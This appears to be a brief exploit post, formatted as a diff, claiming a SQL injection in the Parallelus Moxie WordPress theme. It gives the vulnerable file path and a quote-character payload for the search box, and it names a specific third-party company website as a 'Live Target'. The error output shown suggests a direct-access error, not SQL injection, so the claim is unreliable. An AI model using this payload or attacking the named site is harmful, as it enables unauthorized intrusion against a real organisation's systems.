@@ -1,0 +1,16 @@
+Exploit Title: Parallelus WP Themes SQL Injection 
+Author: William Laurent
+Vendor Homepage: https://themeforest.net/item/moxie-responsive-theme-for-wordpress/4566277
+Price Themes: 80$
+Full Path Exploit: /wp-content/themes/parallelus-moxie/framework/includes/extensions-manager/views/admin-home.php
+
+Vulnerable, if you see search box, type "%27" & click search Extensions. You will redirect to /path/admin.php
+
+Error Output:
+PHP Fatal error: Call to undefined function is_admin() in /home/user/public_html/wp-content/themes/parallelus-moxie/framework/libs/FormsBuilder.php
+
+Live Target: http://radius-mfg.com/web/wp-content/themes/parallelus-moxie/framework/includes/extensions-manager/views/admin-home.php
+
+Solusi: Update ke versi yang terbaru
+
+Thanks to: L4663r666h05t - IndonesianCode.Party - Exploiter.ID
